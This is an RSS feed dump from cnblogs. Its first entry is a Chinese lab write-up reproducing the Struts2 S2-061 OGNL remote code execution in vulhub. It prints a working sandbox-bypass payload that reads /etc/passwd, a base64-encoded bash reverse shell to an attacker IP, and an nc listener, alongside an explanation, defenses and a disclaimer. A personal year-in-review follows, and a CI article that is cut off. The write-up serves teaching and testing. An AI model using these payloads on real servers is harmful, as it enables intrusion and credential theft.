{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "Apache Struts2 OGNL RCE注入",
      "link": "https://www.cnblogs.com/hzhsec/p/19492577",
      "published": "",
      "description": "<h2>\n\t\t\t<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/hzhsec/p/19492577\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 16:02\">\n    <span>Apache Struts2 OGNL RCE注入</span>\n    \n\n</a>\n\n\t\t</h2>\n\t\t    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        Apache Struts2 OGNL RCE漏洞是一种严重的远程代码执行漏洞，攻击者通过构造恶意的OGNL表达式注入到HTTP请求参数中，利用Struts2框架对OGNL表达式处理不当的缺陷，绕过安全沙箱限制，最终实现在目标服务器上执行任意系统命令，从而获取服务器控制权。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"1什么是apache-struts2\">1.什么是Apache Struts2?</h2>\n<p>Apache Struts2（也称为 Struts2）是一个开源的 Java Web 应用框架。<br />\n它主要用于构建企业级 <code>Java EE Web</code> 应用程序，提供 <code>MVC</code>（<code>Model-View-Controller</code>）架构支持，帮助开发者快速开发可维护的 Web 应用。</p>\n<p>Struts2 基于 <code>OGNL</code>（<code>Object-Graph Navigation Language</code>）表达式语言来处理数据绑定、表单验证和动态内容渲染等功能。它是 <code>Struts1</code> 的后继版本，从 2006 年左右开始流行，但由于历史漏洞较多，现在许多项目已转向更现代的框架如 Spring MVC。</p>\n<h2 id=\"2原理\">2.原理</h2>\n<p>(1) <strong>OGNL</strong></p>\n<p><strong>OGNL三要素</strong></p>\n<ol>\n<li>\n<p><strong>Expression（表达式）</strong> 字符串形式的指令，告诉 OGNL “你要做什么”。 例子：<code>user.name</code>、<code>@java.lang.Runtime@getRuntime().exec('calc')</code>、<code>#session.get('user')</code> 等</p>\n</li>\n<li>\n<p><strong>Root（根对象）</strong> 操作的“主体对象”，也就是你主要想访问/修改的对象。 在 Struts2 中，<strong>Root 默认就是 ValueStack（值栈）</strong>，值栈最顶层通常是当前的 Action 实例。 → 访问 Root 对象的属性时，<strong>不需要加任何前缀</strong>，直接写属性名即可。</p>\n</li>\n<li>\n<p><strong>Context（上下文）</strong> 一个 Map 结构（OgnlContext），相当于“运行环境”。 里面存放了各种辅助对象、临时变量、环境信息等。 在 Struts2 中，<strong>Context 就是 ActionContext</strong>，包含了：</p>\n<ul>\n<li><code>#parameters</code>（请求参数）</li>\n<li><code>#request</code></li>\n<li><code>#session</code></li>\n<li><code>#application</code></li>\n<li><code>#attr</code>（依次查找 page→request→session→application）</li>\n<li>值栈本身（作为 Root）<br />\n→ 访问 Context 里的对象，必须加 <strong>#</strong> 前缀，例如 <code>#session.user</code>、<code>#parameters.name</code></li>\n</ul>\n</li>\n</ol>\n<p><strong>OGNL中的重要符号</strong></p>\n<p>有三个<code>#%$</code><br />\n<code>%</code></p>\n<pre><code>%: 其用途是在标志属性为字符串类型时，计算OGNL表达式的值，类似JS中的函数eval()。 \n例如:&lt;s:url value =“%{items.{title}[0]}”/&gt;。获取items对象中title属性，title为数组，取数组索引为0位置的值\n</code></pre>\n<p><code>#</code></p>\n<pre><code>访问 Context（非根对象）里的数据,取 session、request、parameters、application 等时使用\n例如:#session.user #parameters.username #request.get('key')\n</code></pre>\n<p><code>$</code></p>\n<pre><code>1. 在 struts.xml 配置文件里引用 OGNL\n2. 在国际化资源文件（.properties）里引用 OGNL\n例如:struts.xml 里： 资源文件：welcome=${user.name}\n</code></pre>\n<p>(2) <strong>OGNL RCE漏洞原理</strong></p>\n<p>OGNL RCE漏洞是 <code>Struts2</code> 中一类常见的严重安全问题，主要源于框架对 <code>OGNL</code> 表达式的处理不当。</p>\n<p><code>OGNL</code> 是一种强大的表达式语言，用于访问 Java 对象的属性和方法.但在 <code>Struts2</code> 中，如果用户输入（如 <code>HTTP</code> 请求头、参数或标签属性）被直接用于 <code>OGNL</code> 求值，而没有充分验证或转义，就会导致注入攻击。</p>\n<p><strong>漏洞影响范围</strong></p>\n<p>OGNL RCE 漏洞影响了 <code>Struts2</code> 的多个历史版本：</p>\n<ul>\n<li>常见受影响版本：从 <code>Struts 2.0.0</code> 到 <code>2.5.x </code>系列（如 <code>2.5.25</code> 之前），部分 6.x 早期版本有类似问题。但许多旧版本（如 2.3.x）已停止支持（EOL）。<br />\n不是所有 <code>Struts2</code> 应用都易受攻击，取决于配置（如是否使用强制 <code>OGNL</code> 求值或暴露了特定插件）。但遗留系统特别危险。</li>\n</ul>\n<h2 id=\"3漏洞复现\">3.漏洞复现</h2>\n<p>漏洞复现环境<br />\n准备好<code>docker</code></p>\n<ol>\n<li><strong>靶机环境</strong>（使用 vulhub靶场）：</li>\n</ol>\n<pre><code class=\"language-bash\">克隆vulhub仓库\ngit clone --depth 1 https://github.com/vulhub/vulhub.git\n到漏洞地址\ncd vulhub/struts2/s2-061\n</code></pre>\n<p>拉取镜像</p>\n<pre><code class=\"language-sh\">docker-compose up -d \n</code></pre>\n<p>拉取失败的可以使用这个仓库的镜像源配置工具:</p>\n<pre><code class=\"language-sh\">git clone https://github.com/hzhsec/docker_proxy.git\nchmod +x *.sh\n./docker-proxy.sh\n</code></pre>\n<p>再拉取</p>\n<pre><code class=\"language-sh\">docker-compose up -d \n</code></pre>\n<p>使用docker ps查看镜像是否运行</p>\n<p>访问：<a href=\"http://xn--IP-eo8d177o:8080\" rel=\"noopener nofollow\" target=\"_blank\">http://靶机IP:8080</a><br />\n<img alt=\"image.png\" class=\"lazyload\" /></p>\n<ul>\n<li>尝试id注入代码</li>\n</ul>\n<pre><code>http://192.168.41.128:8080/.action?id=%{'hzhsec'+(1+2).toString()}\nurl编码\nhttp://192.168.41.128:8080/.action?id=%25%7B'hzhsec'%2B(1%2B2).toString()%7D\n</code></pre>\n<p><img alt=\"image.png\" class=\"lazyload\" /><br />\n成功将id的值更换执行</p>\n<p>尝试poc</p>\n<pre><code>%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]). (#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]). (#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)). (#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")). (#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)). (#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"cat /etc/passwd\")). (#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}\n\n编码:\n%25%7B(%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D).%20(%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D).%20(%23bean%3D%23instancemanager.newInstance(%22org.apache.commons.collections.BeanMap%22)).(%23bean.setBean(%23stack)).%20(%23context%3D%23bean.get(%22context%22)).(%23bean.setBean(%23context)).(%23macc%3D%23bean.get(%22memberAccess%22)).%20(%23bean.setBean(%23macc)).(%23emptyset%3D%23instancemanager.newInstance(%22java.util.HashSet%22)).(%23bean.put(%22excludedClasses%22%2C%23emptyset)).(%23bean.put(%22excludedPackageNames%22%2C%23emptyset)).%20(%23arglist%3D%23instancemanager.newInstance(%22java.util.ArrayList%22)).(%23arglist.add(%22cat%20%2Fetc%2Fpasswd%22)).%20(%23execute%3D%23instancemanager.newInstance(%22freemarker.template.utility.Execute%22)).(%23execute.exec(%23arglist))%7D\n</code></pre>\n<p><img alt=\"image.png\" class=\"lazyload\" /><br />\n成功读取<code>/etc/passwd</code><br />\n<img alt=\"image.png\" class=\"lazyload\" /></p>\n<p>尝试修改命令反弹shell</p>\n<pre><code>shell命令\nbash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAyLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}\n替换上面的cat命令\n</code></pre>\n<p>攻击机:</p>\n<pre><code>nc -lvvp 4444 启动监听\n</code></pre>\n<p><img alt=\"image.png\" class=\"lazyload\" /><br />\n发送payload</p>\n<pre><code>http://192.168.41.128:8080/.action?id=%25%7B(%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D).%20(%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D).%20(%23bean%3D%23instancemanager.newInstance(%22org.apache.commons.collections.BeanMap%22)).(%23bean.setBean(%23stack)).%20(%23context%3D%23bean.get(%22context%22)).(%23bean.setBean(%23context)).(%23macc%3D%23bean.get(%22memberAccess%22)).%20(%23bean.setBean(%23macc)).(%23emptyset%3D%23instancemanager.newInstance(%22java.util.HashSet%22)).(%23bean.put(%22excludedClasses%22%2C%23emptyset)).(%23bean.put(%22excludedPackageNames%22%2C%23emptyset)).%20(%23arglist%3D%23instancemanager.newInstance(%22java.util.ArrayList%22)).(%23arglist.add(%22bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4yMTAuNjYuMTA4LzQ0NDQgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22)).%20(%23execute%3D%23instancemanager.newInstance(%22freemarker.template.utility.Execute%22)).(%23execute.exec(%23arglist))%7D\n</code></pre>\n<p>成功上线:<br />\n<img alt=\"image.png\" class=\"lazyload\" /></p>\n<h3 id=\"poc原理\">poc原理</h3>\n<ol>\n<li>\n<p><strong>获取 Tomcat 的 InstanceManager</strong> <code>#instancemanager</code> = <code>#application[\"org.apache.tomcat.InstanceManager\"]</code> → 从 <code>ServletContext</code>（application）里拿到<code> Tomcat</code> 的实例管理器，它能“暴力”new 出任何类的实例（即使 OGNL 沙箱不允许）。</p>\n</li>\n<li>\n<p><strong>拿到当前的 ValueStack（值栈）</strong> <code>#stack</code> = <code>#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]</code> → 值栈是 <code>Struts2</code> 的核心，里面存着 <code>Action</code>、<code>request</code>、<code>session</code> 等所有上下文信息。</p>\n</li>\n<li>\n<p><strong>用 <code>BeanMap</code> 魔法绕过访问限制</strong>（最核心的沙箱绕过技巧） <code>#bean</code> = <code>#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")</code> <code>#bean.setBean(#stack)</code> → 创建一个 <code>BeanMap</code>（一种能把任意对象当 Map 用的黑科技类），然后把值栈塞进去。 之后就能通过 <code>.get(\"context\")</code>、 <code>.get(\"memberAccess\")</code> 这种方式，访问原本不允许直接访问的私有字段。</p>\n</li>\n</ol>\n<p>继续链式操作： → 先拿到 <code>context</code> → 再拿到 <code>_memberAccess</code>（OGNL 的安全管理器对象，控制什么能执行、什么类被禁止）</p>\n<ol start=\"4\">\n<li>\n<p><strong>清空沙箱黑名单</strong>（真正解除限制） <code>#emptyset = #instancemanager.newInstance(\"java.util.HashSet\") </code> <code>#bean.put(\"excludedClasses\", #emptyset)</code> <code>#bean.put(\"excludedPackageNames\", #emptyset)</code> → 把 OGNL 的两个黑名单（禁止的类 + 禁止的包）全部清空成空集合。 → 从此 OGNL 什么类都能用了，什么包都能访问了（沙箱彻底失效）。</p>\n</li>\n<li>\n<p><strong>准备命令并执行</strong> <code>#arglist</code> = <code>#instancemanager.newInstance(\"java.util.ArrayList\")</code> <code>#arglist.add(\"cat /etc/passwd\")</code> → 创建一个参数列表，里面放要执行的命令。</p>\n</li>\n</ol>\n<p><code>#execute</code> = <code>#instancemanager.newInstance(\"freemarker.template.utility.Execute\") #execute.exec(#arglist)</code> → 用 Freemarker 自带的 Execute 工具类来执行系统命令（这个类本来不允许被 OGNL 调用，但现在沙箱没了，就能用了）。</p>\n<p>**总结： 这个payload 先用 Tomcat InstanceManager + BeanMap 魔法链 → 找到并修改 OGNL 的安全管理器 → 清空所有黑名单 → 最后用 Freemarker 的 Execute 类执行 cat /etc/passwd。</p>\n<h2 id=\"4漏洞防御\">4.<strong>漏洞防御</strong></h2>\n<p>1、升级到Struts 2的安全版本，比如<code>2.3.32</code>或<code>2.5.16</code>，这些版本包含了对应的安全修复<br />\n2、禁用OGNL表达式的执行，或者使用Struts 2的安全<code>mechansim</code>。</p>\n<p><strong>免责声明</strong><br />\n本文档所包含的漏洞复现方法、技术细节及利用代码，<strong>仅限用于授权的安全测试、教育学习与研究目的</strong>。<br />\n<strong>严禁</strong>在未获得明确授权的情况下，对任何系统进行测试或攻击。任何不当使用所导致的法律责任及后果，均由使用者自行承担。<br />\n作者与文档提供者不承担任何因滥用本文档信息而产生的直接或间接责任。请遵守您所在地的法律法规，并始终践行负责任的网络安全实践。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n\t\t<p class=\"postfoot\">\n\t\t\tposted on \n<span id=\"post-date\">2026-01-16 16:02</span>&nbsp;\n<a href=\"https://www.cnblogs.com/hzhsec\">hzhsec</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n\n\t\t</p>"
    },
    {
      "title": "我的2025：做项目、跑副业、见人、奔波、搬家、维权、再回上海",
      "link": "https://www.cnblogs.com/HaiJun-Aion/p/19492492",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/HaiJun-Aion/p/19492492\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 15:50\">\n    <span>我的2025：做项目、跑副业、见人、奔波、搬家、维权、再回上海</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>2025 年，如果让我用一句话定性，我会说：<strong>我在变强，也在重新选择自己的人生结构。</strong></p>\n<p>这一年我做了很多事，多到我一度不敢回头看。表面上看，我一直在“往前”：写内容、做项目、跑副业、见人、奔波、搬家、维权、再回上海。可只有我自己知道，真正折磨人的不是忙，是那种反复出现的瞬间——我突然意识到：我不是在冲，我是在<strong>被生活推着跑</strong>。</p>\n<p>我确实拿到了一些结果。内容有过爆的时刻，小红书涨了粉，视频剪辑从手忙脚乱到慢慢顺手，有人开始来问我、信我、甚至愿意付费。那段时间我有一种很罕见的笃定：只要我肯学、肯磨，很多事我都能做成。那种“我好像什么都能做”的自信，在这一年里反复把我从低谷里托起来。</p>\n<p>但同样是这一年，我也交了一笔不轻的学费。不是钱那么简单，更是对人、对机会、对“看起来很美”的承诺的那种天真。我曾因为信任做了一个很重的决定；也曾在北京的夜里把事情一条条摊开算清楚，最后发现不是值不值的问题，而是我再拖下去，就会把自己耗到没样子。</p>\n<p>我不想把这篇复盘写成流水账，也不想写成鸡汤。我只想把这一年最真实的部分摆出来：我怎么一点点变强，怎么被现实教育，怎么止损、怎么维权、怎么把自己从废墟里捡回来。</p>\n<hr />\n<h2 id=\"1-我开始把表达当成一件正事\">1. 我开始把表达当成一件正事</h2>\n<p>三月开始，我把很多注意力放在“说清楚”这件事上。</p>\n<p>以前我也输出，但更多像随手记录。2025 年不一样，我开始认真经营表达：每天钻研、每天尝试、每天复盘。公众号有了更明确的正反馈，有几篇文章突然被推起来，评论区开始出现陌生人的共鸣，后台也开始有人来问我问题。那种感觉很奇妙——我写的东西不再只属于我自己，它开始进入别人的生活。</p>\n<p><strong>今年使用最多的AI IDE 就是Trae，也参加了第一期的Trae 征文活动，获得了第二名，Trae给我来了很多成长。</strong></p>\n<h3 id=\"今年在trae-方面的实践\">今年在Trae 方面的实践：</h3>\n<ol>\n<li><a href=\"https://juejin.cn/post/7462542925915848744\" rel=\"noopener nofollow\" target=\"_blank\">字节跳动推出AI编程神器Trae，基于Trae 从 0 开发一个Google 插件！</a><br />\n<img alt=\"image\" class=\"lazyload\" /></li>\n</ol>\n <hr /> \n<hr /> \n<p>2.<a href=\"https://github.com/TickHaiJun/Dompet-App-React-Native\" rel=\"noopener nofollow\" target=\"_blank\">基于Trae 开发的第一个APP</a></p>\n<p>Trae 刚出来Claude模型时，连夜测评它的能力，当时花了5个小时搞出一个App，项目并且还开源了<br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<hr /> \n<ol start=\"3\">\n<li><a href=\"https://github.com/TickHaiJun/Podcast\" rel=\"noopener nofollow\" target=\"_blank\">基于Trae 设计的原型稿</a></li>\n</ol>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>我也开始碰视频。说实话，一开始很狼狈：剪一个一分钟的视频，要花我两三个小时。卡点、配乐、字幕、节奏，哪一样都不像看起来那么简单。我一度怀疑是不是我不适合，但又不甘心。我知道这是一块我之前没尝试过的能力，一旦练出来，就是新的路。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1VHQLYvE6C/?vd_source=824b78ff76f90d1fc4e5e732bb09b3c1\" rel=\"noopener nofollow\" target=\"_blank\">基于Trae还做了原型还原设计稿，没想到视频火了</a><br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<hr /> \n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>这一段给我的礼物，是一种更稳定的自信：很多事看起来复杂，只要拆开、一步步做，就会变得可控。</p>\n<hr />\n<h2 id=\"2-我把想法做成了作品通过vibe-coding\">2. 我把想法做成了作品通过Vibe Coding</h2>\n<p>五月到八月，我进入了一种“手里有活”的状态。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=Mzg2ODI4OTMwMw==&amp;mid=2247492557&amp;idx=1&amp;sn=8949270a3c3bf6f409d6e6046cb8411a&amp;scene=21#wechat_redirect\" rel=\"noopener nofollow\" target=\"_blank\">从懵懂到落地：记录我们第一次成功将大模型“塞”进业务的曲折历程</a></p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>年初做了自己第一款AI应用</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>那段时间我做了很多作品，也开源了不少东西。说白了，就是把想法从脑子里拎出来，做成一个能跑、能看、能用、能被别人理解的东西。</p>\n<p>与此同时，我也给团队做了多次分享，讲我最近在做什么、怎么做、踩了什么坑、怎么绕开。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>中间有两次机会我印象很深：一次是来自一家很大的咨询公司，一次是出海方向的远程邀请。它们都挺诱人，但我当时都拒绝了。原因很简单：我知道我还没准备好。能力没到那个厚度、心态没到那个稳定度，我不想靠运气上去，然后靠硬扛撑住。</p>\n<p>也有一些小小的惊喜：有人买了我做的东西，虽然数量不算多，但足够让我确认——我做的东西不是自嗨，是真的有人需要。更重要的是，越来越多的网友通过我的内容认识我，联系我，问我问题。</p>\n<p>那几个月我最大的收获不是“做了多少”，而是一个更朴素的结论：<strong>想法不值钱，做出来才值钱。</strong></p>\n<hr />\n<h2 id=\"3-有人愿意为我的能力买单\">3. 有人愿意为我的能力买单</h2>\n<p>九月到十一月，我的副业开始像一门“正经事”。</p>\n<p>咨询变多了。有的是临时问答，有的是更系统的陪跑。我接了三份陪跑，也因此认识了几位很投缘的朋友，都是山西的。我们聊项目、聊选择、聊怎么把事情做成，也聊怎么在现实里不把自己弄丢。</p>\n<p>这份关系很珍贵。它不是那种互相吹捧的热闹，而是我能明显感到：对方因为我的建议少走了弯路，事情推进得更顺，而我也因为对方的反馈变得更坚定。那种“我真的帮到了人”的成就感，比数字更实在。</p>\n<p>我也在这一段第一次更清晰地看到我的位置：我不是只能埋头做项目的人，我还可以把经验讲清楚，把复杂拆简单，把别人卡住的点指出来。这是一种能力，也是一种责任感。</p>\n<p>这一段让我相信：靠自己攒出来的口碑，慢，但稳。</p>\n<hr />\n<h2 id=\"4-我重新确认了钱该花在哪\">4. 我重新确认了“钱该花在哪”</h2>\n<p>国庆我和家人自驾出去玩了一趟。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>风很大，天很高，羊肉很香。我们在草原上待了一天，我给父母安排了越野卡丁车，让他们在草地上跑一圈；我和姐姐骑了马，笑得像回到小时候。那几天我很放松，甚至有点恍惚——原来我努力这么久，最想换来的并不是某个头衔，而是这种“我能让他们开心”的底气。</p>\n<p>我以前对花钱很谨慎，总觉得要攒着、要算计回报。可当我把钱花在家人身上，那种舒坦很直接：不需要证明，不需要解释，花出去就是一种“我扛得住了”的确认。</p>\n<hr />\n<h2 id=\"5-去北京一趟我把胆子捡了回来\">5. 去北京一趟，我把胆子捡了回来</h2>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>十月我去北京参加了一个活动，也算第一次为了这类事出远门。2026年，多输出AI，多参加活动。</p>\n<p>现场人很多，节奏很快，信息密得让人喘不过气。那天我最大的感受，不是见了什么产品，而是突然明白：机会真的会从我身边走过去，走过去就没了。很多时候不是我不够好，是我不敢站出来，或者我下意识觉得“我还不够格”。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>去天津路上，熟悉的感觉</p>\n<p>我也去了天津，见了老朋友老李。我们聊了一整天，我帮他搬运整理食品，他带我吃了天津菜，甚至让我体验了一把保时捷 911。最后他把我送到机场。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>那一天让我很感慨：这个世界其实很大，也很活，我不能总把自己困在“怕麻烦、怕尴尬、怕出丑”的情绪里。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>今年我也买了不少书，也读了不少书。《亲密关系》《认知驱动》《纳瓦尔宝典》……它们没有给我标准答案，但给了我更清醒的视角：我要对自己的情绪负责，对自己的选择负责，对自己的长期负责。</p>\n<hr />\n<h2 id=\"6-我相信过他也因此完成了一次祛魅\">6. 我相信过他，也因此完成了一次祛魅</h2>\n<p>十一月底，我做了一个很重的决定：离职，去北京试一次。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>这件事我并不是冲动。相反，我想了将近一个月。朋友“他”邀请过我三次，前两次我都拒绝了。第三次创始人亲自找我，话说得很漂亮，未来画得很大，而我也确实在那个阶段渴望一次更大的空间。再加上对“他”的信任，我最终点了头。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>离开前，我做了一件我很想做的事：把爸爸接到上海。那是他第一次来上海，也是他第一次坐飞机。我去接他的时候，他脸上的喜悦藏不住。我带他逛了很多地方，拍了很多照片。送他去机场那天，我心里很踏实——那种成就感，不来自任何评价，只来自“我能带他看世界”的瞬间。</p>\n<p>今年我也给妈妈买了新手机，她之前那部太卡了。再小的事情，落在父母身上都是实在的改变。</p>\n<p>然后我去了北京。</p>\n<p>现实很快给了我一记闷棍。之前说的和实际差太多太多。我会在很短时间内发现：有些话只是话，有些承诺只是情绪，有些“格局”只是包装。我不想在这里写具体细节，但我可以写结论——这次经历让我完成了一次祛魅：对人、对所谓“机会”、对“看起来很美”的未来。</p>\n<p>我也更清楚了一件事：我并不是不能吃苦，我是不愿意把我的尊严和时间押在不靠谱的人和不靠谱的事上。</p>\n<hr />\n<h2 id=\"7-我救了三只狗也被这座城市的善意接住\">7. 我救了三只狗，也被这座城市的善意接住</h2>\n<p>这一年我救了三只狗。<br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<p>第一只是中华田园犬，在公园遇到的。它很瘦，眼神怯，但又不躲人。</p>\n<p>第二只是边牧，在公司附近，它更像是走丢的孩子，聪明又无助。<br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<p>第三只是阿拉斯加，在豫园附近，体型很大，却一点安全感都没有。</p>\n<p>我喜欢狗。遇见它们的时候，我很难装作没看见。我做的事其实也不复杂：拍照、发帖、联系、筛选领养人、把信息对齐清楚，然后送它们去新家。</p>\n<p>这件事最打动我的，不是我多善良，而是我发现：大城市真的有很多愿意伸手的人。我发出求助，真的会有人回应。我以为我在救它们，其实在某些时刻，是这些善意在把我从疲惫里接住。</p>\n<hr />\n<h2 id=\"8-一笔沉没成本止损维权和不再委屈自己\">8. 一笔沉没成本：止损、维权、和不再委屈自己</h2>\n<p>十二月初，北京给了我最硬的一课。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>我在北京待了十来天，一直住酒店。对方之前说会报销，但后来什么都没有。入职前一天我找了房子，租房费用、中介费用、再加上各种奔波成本，堆起来是一笔不小的支出。更糟的是：入职第一天我就通过另一位同样处境的人了解到了真实情况；再加上“他”下班后说的一些话，我很快确定——这里不是我该待的地方。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>那一刻最难的其实不是离开，而是面对沉没成本。我已经付出那么多，我会本能地想“再忍忍，再等等”。但我很庆幸，那天我没骗自己。我选择止损。</p>\n<p>随之而来的就是维权。房子我没入住，合同日期也没开始，但管家很无赖，甚至带着恐吓。那种“我讲理他就耍赖”的感觉很恶心。我一开始也很烦，后来干脆不和她废话，直接走流程，通过 12315 协调，拿回了一部分。理论上可以拿回更多，但要继续耗时间精力，我当时选择到此为止。</p>\n<p>这一段时间，让家里也没少操心，哎....</p>\n<p>我最想写给自己的不是“钱亏了”，而是一个更重要的结论：<strong>以后遇到不公，我不再用委屈换和平。该维权就维权，该翻脸就翻脸。</strong></p>\n<hr />\n<h2 id=\"9-回到上海我把自己一点点拉回正轨\">9. 回到上海：我把自己一点点拉回正轨</h2>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>十二月中旬我回到了上海。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>收拾好家里的工位</p>\n<p>那段时间我能量很低。不是累，是一种被现实撞过之后的钝。我会怀疑自己、怀疑判断、怀疑信任，甚至怀疑“是不是我太敏感了”。但生活不会等我缓过来，它只会继续往前。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>我做的第一件事是把我自己拉回正常：吃饭、睡觉、见朋友。后来我和老耿去了杭州散心。城市很安静，走在路上我突然发现：风还是一样吹，灯还是一样亮，我不会因为受挫就失去明天。</p>\n<p>我慢慢控住场了。把生活拉回正轨了。也把那句最重要的话重新捡回来——<strong>我在变强，也在重新选择自己的人生结构。</strong></p>\n<hr />\n<h2 id=\"最后\">最后</h2>\n<p>回头看 2025 年，我最大的变化不是“我做了多少”，而是<strong>我对人生结构的要求变高了</strong>。</p>\n<p>以前我会把努力当成答案。现在我更在意：这份努力能不能沉淀，能不能让我拥有更多选择权。以前我遇到烂事会先忍，想着“算了”。但北京那一段之后我更确定：委屈不会换来尊重，只会换来下一次更大的代价。该止损就止损，该维权就维权——哪怕沉没成本已经砸下去，我也要把自己从泥里拎出来。</p>\n<p>这一年我也完成了一次祛魅：<br />\n对“机会”的祛魅，对“关系”的祛魅，对“画出来的未来”的祛魅。<br />\n我开始相信一句话：<strong>真正值得的机会，不会只靠嘴说；真正可靠的人，也不会只靠情绪绑架。</strong></p>\n<p>如果说 2025 年教会了我什么，我觉得是三件事：</p>\n<p>第一，能力不是拿来逞强的，是拿来兜底的。<br />\n我在最狼狈的时候，靠自己把局面稳住了。那种“我能扛住”的底气，是真的。</p>\n<p>第二，钱花在家人身上，会变成一种很踏实的成就感。<br />\n我以前以为成就感来自外界认可，今年我更确定：来自父母的笑、来自家人的安心、来自“我可以照顾他们”。</p>\n<p>第三，善意是会流动的。<br />\n我帮过人，也被人帮过；我救过狗，也被陌生人的热心治愈过。世界不全是烂人，但我得学会识别，学会筛选，学会保护自己。</p>\n<p>2026 年我不想再喊口号了。我只想做三件更具体的事：</p>\n<ul>\n<li><strong>把一条能长期跑的主线做出来</strong>：让输出、作品和服务真正形成稳定的节奏，而不是靠运气起伏。</li>\n<li><strong>给信任立规矩</strong>：合作要有边界，承诺要能落地，任何决定都要留后手。</li>\n<li><strong>把家放进计划里</strong>：不是“有空再说”，而是本来就该排在前面。</li>\n</ul>\n<p>2025 年没有把我推到高处，但它把我从幻觉里拽出来了。<br />\n我依然会往前走，只是以后我更在乎的不是速度，而是方向；不是热闹，而是结构。</p>\n<p><strong>我在变强，也在重新选择自己的人生结构。</strong></p>\n<p>希望2026年一切顺利!</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 15:50</span>&nbsp;\n<a href=\"https://www.cnblogs.com/HaiJun-Aion\">程序员海军</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "持续集成的价值流——质量门禁、报告可视化与快速反馈的设计重点",
      "link": "https://www.cnblogs.com/shiyuelp/p/19492092",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/shiyuelp/p/19492092\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 14:53\">\n    <span>持续集成的价值流——质量门禁、报告可视化与快速反馈的设计重点</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p><strong>写在前面，本人目前处于求职中，如有合适内推岗位，请加：lpshiyue 感谢。同时还望大家一键三连，赚点奶粉钱。</strong></p>\n<p><strong>系列文章已完结，全文阅读链接：<a href=\"https://p.kdocs.cn/s/EJACICRFACQBS\" rel=\"noopener nofollow\" 